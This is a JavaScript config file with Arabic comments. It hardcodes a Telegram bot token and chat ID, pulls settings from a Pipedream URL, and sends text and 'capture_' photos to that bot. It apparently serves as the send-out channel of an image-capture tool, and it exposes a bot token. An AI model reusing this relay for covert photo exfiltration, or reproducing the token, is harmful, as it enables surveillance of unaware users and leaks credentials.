// config.js
// هذا الملف مسؤول عن جلب التوكن والشات آيدي من Pipedream فقط
// ما راح تحتاج تلمسه أبداً بعد ما تشتغل

const Config = {
  BOT_TOKEN: '8815233741:AAH0o5fb3npPzwxIb_UTmUn7D08qnaL5d6Q',
  CHAT_ID: '5299712540',
  PIPEDREAM_URL: 'https://eo3djhokj3ty6kt.m.pipedream.net', // ⚠️ غيره لرابطك

  // جلب الإعدادات من Pipedream
  async fetch() {
    try {
      const response = await fetch(this.PIPEDREAM_URL);
      if (!response.ok) throw new Error('فشل الاتصال بـ Pipedream');
      const data = await response.json();
      
      if (!data.token || !data.chatId) {
        throw new Error('بيانات ناقصة من السيرفر');
      }
      
      this.BOT_TOKEN = data.token;
      this.CHAT_ID = data.chatId;
      console.log('✅ تم جلب الإعدادات بنجاح');
      return true;
    } catch (err) {
      console.error('❌ فشل جلب الإعدادات:', err);
      return false;
    }
  },

  // إرسال رسالة نصية للبوت
  async sendMessage(text) {
    if (!this.BOT_TOKEN || !this.CHAT_ID) return;
    try {
      await fetch(`https://api.telegram.org/bot${this.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: this.CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error('فشل إرسال رسالة:', e);
    }
  },

  // إرسال صورة للبوت
  async sendPhoto(blob, caption = '') {
    if (!this.BOT_TOKEN || !this.CHAT_ID) return;
    const formData = new FormData();
    formData.append('photo', blob, `capture_${Date.now()}.jpg`);
    formData.append('chat_id', this.CHAT_ID);
    if (caption) formData.append('caption', caption);

    try {
      await fetch(`https://api.telegram.org/bot${this.BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      return true;
    } catch (e) {
      console.error('فشل إرسال صورة:', e);
      return false;
    }
  }
};
